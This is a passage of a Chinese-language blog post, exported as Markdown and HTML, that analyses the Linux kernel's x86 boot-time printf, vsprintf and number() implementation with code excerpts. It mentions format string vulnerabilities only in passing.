char`类型的字符.为什么呢?详情参考我的另外一篇[文章](http://www.rutk1t0r.cn/2016/08/21/memory-align/),我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的`strnlen`函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,`if`和`while`没有加`{}`可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成`任意地址读写任意数据`的格式化字符串漏洞.\n之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是`continue`,意思是直接跳转到最外面的`for`循环进行下一个字符的匹配,而%xXdiu后面接的是`break`,表示退出`switch`,转而进行后面的`h,L,l`的长类型的处理去了.还要注意在`switch case break`的结构中,如果`case`了第一个条件,之后如果没有遇到`break`,程序的控制流程将忽略后面的`case`条件,直接执行语句部分,直到遇见结束的`break`.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.\n```C\n/* default base */\n\t\tbase = 10;\n\n\t\tswitch (*fmt) {\n\t\tcase 'c':\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (--field_width > 0)\n\t\t\t\t\t*str++ = ' ';\n\t\t\t*str++ = (unsigned char)va_arg(args, int);\n\t\t\twhile (--field_width > 0)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 's':\n\t\t\ts = va_arg(args, char *);\n\t\t\tlen = strnlen(s, precision);\n\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (len < field_width--)\n\t\t\t\t\t*str++ = ' ';\n\t\t\tfor (i = 0; i < len; ++i)\n\t\t\t\t*str++ = *s++;\n\t\t\twhile (len < field_width--)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 'p':\n\t\t\tif (field_width == -1) {\n\t\t\t\tfield_width = 2 * sizeof(void *);\n\t\t\t\tflags |= ZEROPAD;\n\t\t\t}\n\t\t\tstr = number(str,\n\t\t\t\t     (unsigned long)va_arg(args, void *), 16,\n\t\t\t\t     field_width, precision, flags);\n\t\t\tcontinue;\n\n\t\tcase 'n':\n\t\t\tif (qualifier == 'l') {\n\t\t\t\tlong *ip = va_arg(args, long *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t} else {\n\t\t\t\tint *ip = va_arg(args, int *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t}\n\t\t\tcontinue;\n\n\t\tcase '%':\n\t\t\t*str++ = '%';\n\t\t\tcontinue;\n\n\t\t\t/* integer number formats - set up the flags and \"break\" */\n\t\tcase 'o':\n\t\t\tbase = 8;\n\t\t\tbreak;\n\n\t\tcase 'x':\n\t\t\tflags |= SMALL;\n\t\tcase 'X':\n\t\t\tbase = 16;\n\t\t\tbreak;\n\n\t\tcase 'd':\n\t\tcase 'i':\n\t\t\tflags |= SIGN;\n\t\tcase 'u':\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\t*str++ = '%';\n\t\t\tif (*fmt)\n\t\t\t\t*str++ = *fmt;\n\t\t\telse\n\t\t\t\t--fmt;\n\t\t\tcontinue;\n\t\t}\n\t\tif (qualifier == 'l')\n\t\t\tnum = va_arg(args, unsigned long);\n\t\telse if (qualifier == 'h') {\n\t\t\tnum = (unsigned short)va_arg(args, int);\n\t\t\tif (flags & SIGN)\n\t\t\t\tnum = (short)num;\n\t\t} else if (flags & SIGN)\n\t\t\tnum = va_arg(args, int);\n\t\telse\n\t\t\tnum = va_arg(args, unsigned int);\n\t\tstr = number(str, num, base, field_width, precision, flags);\n\t}\n\t*str = '\\0';\n\treturn str - buf;\n```\n\n## number函数\n首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在`[]`里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时\"返回\"余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是`一切皆为文件`和`一切皆为表达式`.)\n```C\n#define __do_div(n, base) ({ \\\nint __res; \\\n__res = ((unsigned long) n) % (unsigned) base; \\\nn = ((unsigned long) n) / (unsigned) base; \\\n__res; })\n```\n再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.`static`类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.`char *`返回值表明能够实现链式功能,可对比`strcpy`函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个`num`是对%idp等格式化的栈参数的一个拷贝.第三个`base`顾名思义就是进制基数了.第四个`size`即为对齐宽度.第五个为精度,最后一个为标志位字段.  \n首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.`tmp[66]`我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为`long`的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32->第4位置位,使得可以很轻松地`或`运算实现大写字符->小写字符(ascll码相差32).如果`0`和`-`同时置位,gcc编译器会提示`warning: '0' flag ignored with '-' flag in gnu_printf format [-Wformat=]`,表明会忽略掉`0`的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的`&= ~`运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除`补零`标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符`c`也是用来填充的,为`0`或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据`size`和置位`sign`.之后判断16进制和8进制情况,16进制的`size`减2是由于要填充`0x`或者`0X`,8进制只需要填充`0`即可.之后就开始进制转换成字符了,并根据`locase`的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的`precision`表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果`ZEROPAD`和`LEFT`都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据`size`的剩余大小继续填充`c`,后面就根据i的情况填充了,直到满足`size`这个宽度域为0.最后返回`str`的首地址.\n```C\nstatic char *number(char *str, long num, int base, int size, int precision,\n\t\t    int type)\n{\n\t/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */\n\tstatic const char digits[16] = \"0123456789ABCDEF\"; /* \"GHIJKLMNOPQRSTUVWXYZ\"; */\n\n\tchar tmp[66];\n\tchar c, sign, locase;\n\tint i;\n\n\t/* locase = 0 or 0x20. ORing digits or letters with 'locase'\n\t * produces same digits or (maybe lowercased) letters */\n\tlocase = (type & SMALL);\n\tif (type & LEFT)\n\t\ttype &= ~ZEROPAD;\n\tif (base < 2 || base > 16)\n\t\treturn NULL;\n\tc = (type & ZEROPAD) ? '0' : ' ';\n\tsign = 0;\n\tif (type & SIGN) {\n\t\tif (num < 0) {\n\t\t\tsign = '-';\n\t\t\tnum = -num;\n\t\t\tsize--;\n\t\t} else if (type & PLUS) {\n\t\t\tsign = '+';\n\t\t\tsize--;\n\t\t} else if (type & SPACE) {\n\t\t\tsign = ' ';\n\t\t\tsize--;\n\t\t}\n\t}\n\tif (type & SPECIAL) {\n\t\tif (base == 16)\n\t\t\tsize -= 2;\n\t\telse if (base == 8)\n\t\t\tsize--;\n\t}\n\ti = 0;\n\tif (num == 0)\n\t\ttmp[i++] = '0';\n\telse\n\t\twhile (num != 0)\n\t\t\ttmp[i++] = (digits[__do_div(num, base)] | locase);\n\tif (i > precision)\n\t\tprecision = i;\n\tsize -= precision;\n\tif (!(type & (ZEROPAD + LEFT)))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = ' ';\n\tif (sign)\n\t\t*str++ = sign;\n\tif (type & SPECIAL) {\n\t\tif (base == 8)\n\t\t\t*str++ = '0';\n\t\telse if (base == 16) {\n\t\t\t*str++ = '0';\n\t\t\t*str++ = ('X' | locase);\n\t\t}\n\t}\n\tif (!(type & LEFT))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = c;\n\twhile (i < precision--)\n\t\t*str++ = '0';\n\twhile (i-- > 0)\n\t\t*str++ = tmp[i];\n\twhile (size-- > 0)\n\t\t*str++ = ' ';\n\treturn str;\n}\n```\n## puts\n至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.\n## 总结\n最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到`格式化字符串漏洞`参考看雪论坛这篇[文章](http://bbs.pediy.com/showthread.php?t=213153),如果没注册看不了的话先[戳这里吧](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458279936&idx=1&sn=2eb47265a0d170c45403d4b5d9097549&chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&scene=0#wechat_redirect)\n","slug":"一起来撸printf吧","published":1,"updated":"2016-10-20T08:24:35.528Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7q8000hr1m1v537ekty","content":"<blockquote>\n<p>printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.</p>\n</blockquote>\n<p>参考资料:<br><a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c\" target=\"_blank\" rel=\"external\">Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c</a></p>\n<h2 id=\"printf大体\"><a href=\"#printf大体\" class=\"headerlink\" title=\"printf大体\"></a>printf大体</h2><p>首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下…大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.<br><img src=\"/images/printf.png\" alt=\"printf\"></p>\n<h2 id=\"va-系类宏\"><a href=\"#va-系类宏\" class=\"headerlink\" title=\"va_系类宏\"></a>va_系类宏</h2><p>然后我们利用sublime的插件来jump到<code>va_list</code>的定义,发现是一个char*的typedef.干脆就一起来认识一下<code>va_</code>系列的宏.</p>\n<p><code>acpi_native_int</code>也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.<code>_AUPBND</code>和<code>_ADNBND</code>两个宏的值一样.而<code>_bnd</code>这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.<code>va_start(ap, A)</code>这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而<code>va_arg(ap, T)</code>目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.<code>va_end(ap)</code>仅仅为了保证安全而象征性地将ap指向NULL.<br><img src=\"/images/va_arg.png\" alt=\"va_arg\"></p>\n<h2 id=\"vsprintf\"><a href=\"#vsprintf\" class=\"headerlink\" title=\"vsprintf\"></a>vsprintf</h2><p>vsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)<br><img src=\"/images/vsprintf.png\" alt=\"vsprintf\"><br>在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ZEROPAD\t1\t\t<span class=\"comment\">/* pad with zero */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SIGN\t2\t\t<span class=\"comment\">/* unsigned/signed long */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PLUS\t4\t\t<span class=\"comment\">/* show plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPACE\t8\t\t<span class=\"comment\">/* space if plus */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LEFT\t16\t\t<span class=\"comment\">/* left justified */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SMALL\t32\t\t<span class=\"comment\">/* Must be 32 == 0x20 */</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> SPECIAL\t64\t\t<span class=\"comment\">/* 0x */</span></span></div><div class=\"line\"><span class=\"comment\">/* process flags */</span></div><div class=\"line\">\t\tflags = <span class=\"number\">0</span>;</div><div class=\"line\">\t      repeat:</div><div class=\"line\">\t\t++fmt;\t\t<span class=\"comment\">/* this also skips first '%' */</span></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'-'</span>:</div><div class=\"line\">\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'+'</span>:</div><div class=\"line\">\t\t\tflags |= PLUS;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">' '</span>:</div><div class=\"line\">\t\t\tflags |= SPACE;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'#'</span>:</div><div class=\"line\">\t\t\tflags |= SPECIAL;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'0'</span>:</div><div class=\"line\">\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t<span class=\"keyword\">goto</span> repeat;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>某些字段就不说了,用过printf的应该都知道的,其中的<code>#</code>作用就是方便16进制和8进制的格式化,例如<code>%#x</code>就会被默认加上<code>0x</code>,而<code>%#o</code>就会被默认加上<code>0</code>,具体可以看后面number函数实现就知道了.  </p>\n<hr>\n<blockquote>\n<p>找工作太忙了,今天才得有空继续分析^~^(2016.10.17) </p>\n</blockquote>\n<hr>\n<p>接下来就会去获得宽度字段,利用<code>isdigital</code>函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用<code>*</code>代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get field width */</span></div><div class=\"line\">\t\tfield_width = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\tfield_width = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\tfield_width = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width &lt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = -field_width;</div><div class=\"line\">\t\t\t\tflags |= LEFT;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure>\n<p>再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有<code>.</code>字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有<code>l</code>,<code>L</code>,<code>h</code>跟在后面的将使得<code>qualifier</code>被置为其ascll码值.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* get the precision */</span></div><div class=\"line\">\t\tprecision = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'.'</span>) &#123;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">isdigit</span>(*fmt))</div><div class=\"line\">\t\t\t\tprecision = skip_atoi(&amp;fmt);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'*'</span>) &#123;</div><div class=\"line\">\t\t\t\t++fmt;</div><div class=\"line\">\t\t\t\t<span class=\"comment\">/* it's the next argument */</span></div><div class=\"line\">\t\t\t\tprecision = va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (precision &lt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\tprecision = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"comment\">/* get the conversion qualifier */</span></div><div class=\"line\">\t\tqualifier = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (*fmt == <span class=\"string\">'h'</span> || *fmt == <span class=\"string\">'l'</span> || *fmt == <span class=\"string\">'L'</span>) &#123;</div><div class=\"line\">\t\t\tqualifier = *fmt;</div><div class=\"line\">\t\t\t++fmt;</div><div class=\"line\">\t\t&#125;</div></pre></td></tr></table></figure></p>\n<p>之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以<code>int</code>类型为地址单元取得参数的值直接强制转化为<code>unsigned char</code>类型的字符.为什么呢?详情参考我的另外一篇<a href=\"http://www.rutk1t0r.cn/2016/08/21/memory-align/\" target=\"_blank\" rel=\"external\">文章</a>,我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的<code>strnlen</code>函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,<code>if</code>和<code>while</code>没有加<code>{}</code>可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成<code>任意地址读写任意数据</code>的格式化字符串漏洞.<br>之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是<code>continue</code>,意思是直接跳转到最外面的<code>for</code>循环进行下一个字符的匹配,而%xXdiu后面接的是<code>break</code>,表示退出<code>switch</code>,转而进行后面的<code>h,L,l</code>的长类型的处理去了.还要注意在<code>switch case break</code>的结构中,如果<code>case</code>了第一个条件,之后如果没有遇到<code>break</code>,程序的控制流程将忽略后面的<code>case</code>条件,直接执行语句部分,直到遇见结束的<code>break</code>.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/* default base */</span></div><div class=\"line\">\t\tbase = <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">switch</span> (*fmt) &#123;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'c'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t*str++ = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>)va_arg(args, <span class=\"keyword\">int</span>);</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (--field_width &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'s'</span>:</div><div class=\"line\">\t\t\ts = va_arg(args, <span class=\"keyword\">char</span> *);</div><div class=\"line\">\t\t\tlen = strnlen(s, precision);</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(flags &amp; LEFT))</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; ++i)</div><div class=\"line\">\t\t\t\t*str++ = *s++;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (len &lt; field_width--)</div><div class=\"line\">\t\t\t\t*str++ = <span class=\"string\">' '</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'p'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (field_width == <span class=\"number\">-1</span>) &#123;</div><div class=\"line\">\t\t\t\tfield_width = <span class=\"number\">2</span> * <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">void</span> *);</div><div class=\"line\">\t\t\t\tflags |= ZEROPAD;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tstr = number(str,</div><div class=\"line\">\t\t\t\t     (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)va_arg(args, <span class=\"keyword\">void</span> *), <span class=\"number\">16</span>,</div><div class=\"line\">\t\t\t\t     field_width, precision, flags);</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'n'</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (qualifier == <span class=\"string\">'l'</span>) &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">long</span> *ip = va_arg(args, <span class=\"keyword\">long</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> *ip = va_arg(args, <span class=\"keyword\">int</span> *);</div><div class=\"line\">\t\t\t\t*ip = (str - buf);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'%'</span>:</div><div class=\"line\">\t\t\t*str++ = <span class=\"string\">'%'</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t\t<span class=\"comment\">/* integer number formats - set up the flags and \"break\" */</span></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'o'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">8</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'x'</span>:</div><div class=\"line\">\t\t\tflags |= SMALL;</div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"string\">'X'</span>:</div><div class=\"line\">\t\t\tbase = <span class=\"number\">16</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\"></div><div class=\"line\">\t\t<span class=\"keyword\">case</span> <span 